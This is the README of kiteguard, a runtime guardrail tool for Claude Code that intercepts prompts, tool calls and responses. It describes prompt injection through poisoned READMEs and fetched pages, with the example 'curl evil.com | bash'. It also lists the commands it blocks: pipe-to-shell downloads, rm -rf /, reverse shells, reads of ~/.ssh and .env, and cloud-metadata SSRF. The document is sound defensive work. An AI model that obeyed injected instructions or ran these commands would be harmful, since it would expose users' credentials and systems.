<p align="center">
  <img src="docs/src/assets/kiteguard.png" alt="kiteguard logo" width="180" />
</p>

<p align="center">
  <em>Runtime security guardrails for Claude Code and AI coding agents</em>
</p>

<p align="center">
  <strong>kiteguard watches every move your AI agent makes — and stops the dangerous ones.</strong>
</p>

[![CI](https://github.com/DhivakaranRavi/kiteguard/actions/workflows/ci.yml/badge.svg)](https://github.com/DhivakaranRavi/kiteguard/actions/workflows/ci.yml)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE)
![Built with Rust](https://img.shields.io/badge/built%20with-Rust-orange.svg)

---

## Install

**Option 1 — Install script (quickest):**
```bash
curl -sSL https://raw.githubusercontent.com/DhivakaranRavi/kiteguard/main/scripts/install.sh | bash
```

**Option 2 — Build from source (recommended for security-conscious users):**
```bash
git clone https://github.com/DhivakaranRavi/kiteguard.git
cd kiteguard
cargo build --release
sudo install -m755 target/release/kiteguard /usr/local/bin/kiteguard
kiteguard init
```

> No dependencies beyond a Rust toolchain. Get Rust at [rustup.rs](https://rustup.rs).

---

## Why kiteguard

Claude Code is an agent harness — it autonomously executes shell commands, reads your entire codebase, fetches external URLs, and modifies files without asking for confirmation. That power also means:

- A poisoned README can instruct Claude to run `curl evil.com | bash`
- A web page Claude fetches can contain embedded instructions
- PII in files Claude reads goes straight to the Claude API
- No security team has visibility into what developers are doing with Claude

kiteguard solves this by intercepting at **four critical points** in every Claude Code session — before damage happens.

---

## How it works

<p align="center">
  <img src="docs/src/assets/kiteguard-architecture.png" alt="KiteGuard architecture diagram" width="900" />
</p>

<!--
```mermaid
graph LR
    DEV([Developer])

    subgraph PIPELINE[Claude Code Pipeline]
        direction TB
        P1[Prompt received]
        P2[Tool call issued]
        P3[Tool response loaded]
        P4[Response ready]
    end

    subgraph KG[KiteGuard]
        direction TB
        H1[UserPromptSubmit\nBlock PII and injection]
        H2[PreToolUse\nBlock commands and paths and URLs]
        H3[PostToolUse\nScan loaded content]
        H4[Stop\nRedact secrets and PII]
        PE[Policy Engine]
        DET[Detector Suite]
        LOG[Audit Logger]
    end

    STORE[(kiteguard storage)]
    WH([Webhook])

    DEV -->|prompt| P1
    P1  --> H1
    H1 -->|allowed| P2
    P2  --> H2
    H2 -->|allowed| P3
    P3  --> H3
    H3 -->|allowed| P4
    P4  --> H4
    H4 -->|safe response| DEV

    H1 --> PE
    H2 --> PE
    H3 --> PE
    H4 --> PE
    PE  --> DET
    DET -->|verdict| H1
    DET -->|verdict| H2
    DET -->|verdict| H3
    DET -->|verdict| H4

    H1  --> LOG
    H2  --> LOG
    H3  --> LOG
    H4  --> LOG
    PE  -.-> STORE
    LOG -.-> STORE
    LOG --> WH

    style DEV  fill:#dbeafe,stroke:#3b82f6,color:#1e3a5f

    style PIPELINE fill:#f8fafc,stroke:#94a3b8,color:#0f172a
    style P1 fill:#f8fafc,stroke:#94a3b8,color:#334155
    style P2 fill:#f8fafc,stroke:#94a3b8,color:#334155
    style P3 fill:#f8fafc,stroke:#94a3b8,color:#334155
    style P4 fill:#f8fafc,stroke:#94a3b8,color:#334155

    style KG  fill:#fef9f0,stroke:#f59e0b,color:#78350f
    style H1  fill:#fef2f2,stroke:#dc2626,color:#7f1d1d
    style H2  fill:#fef2f2,stroke:#dc2626,color:#7f1d1d
    style H3  fill:#fef2f2,stroke:#dc2626,color:#7f1d1d
    style H4  fill:#fef2f2,stroke:#dc2626,color:#7f1d1d
    style PE  fill:#f0fdf4,stroke:#16a34a,color:#14532d
    style DET fill:#f0fdf4,stroke:#16a34a,color:#14532d
    style LOG fill:#f0fdf4,stroke:#16a34a,color:#14532d

    style STORE fill:#f1f5f9,stroke:#64748b,color:#1e293b
    style WH    fill:#f3e8ff,stroke:#9333ea,color:#3b0764
```
-->

---

## What it blocks

| Threat | Hook |
|---|---|
| `curl \| bash`, `wget \| sh` pipe attacks | PreToolUse |
| `rm -rf /`, reverse shells | PreToolUse |
| Reads of `~/.ssh`, `.env`, credentials | PreToolUse |
| Writes to `/etc`, `.claude/settings.json` | PreToolUse |
| SSRF to cloud metadata endpoints | PreToolUse |
| Prompt injection in developer input | UserPromptSubmit |
| PII (SSN, credit cards, emails) in prompts | UserPromptSubmit |
| Injection embedded in files Claude reads | PostToolUse |
| Secrets/API keys echoed in responses | Stop |

---

## Configuration

Works with secure defaults. To customize for your org, create `~/.kiteguard/rules.json`:

```json
{
  "bash": {
    "block_patterns": ["curl[^|]*\\|[^|]*(bash|sh)"]
  },
  "file_paths": {
    "block_read": ["**/.env", "**/.ssh/**"]
  },
  "pii": {
    "block_in_prompt": true,
    "types": ["ssn", "credit_card", "email"]
  },
  "webhook": {
    "enabled": true,
    "url": "https://your-siem.company.com/kiteguard"
  }
}
```

---

## CLI

| Command | Description |
|---|---|
| `kiteguard init` | Register kiteguard hooks with Claude Code |
| `kiteguard audit` | View the local audit log (all events) |
| `kiteguard audit verify` | Verify audit log hash-chain integrity — detects tampering |
| `kiteguard policy` | View active security policies (alias for `policy list`) |
| `kiteguard policy list` | Print all active policy settings |
| `kiteguard policy path` | Print the path to the active `rules.json` file |
| `kiteguard policy sign` | Re-sign `rules.json` after manual edits |
| `kiteguard --version` | Print version |
| `kiteguard --help` | Show help |

---

## Audit log

Every event is logged to `~/.kiteguard/audit.log`:

```
TIMESTAMP                      HOOK                      VERDICT   RULE
2026-03-28T10:23:01Z           PreToolUse                🚫 block  dangerous_command
2026-03-28T10:23:45Z           UserPromptSubmit          ✅ allow
```

---

## Architecture

Built in Rust as a single static binary. No runtime dependencies.

- Hooks dispatch to `src/hooks/` handlers
- Detection logic lives in `src/detectors/`
- Policy engine in `src/engine/`
- Audit logging in `src/audit/`

See [docs/architecture.md](docs/architecture.md) for the full technical design.

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Issues labeled `good first issue` are a great starting point.

## License

MIT OR Apache-2.0
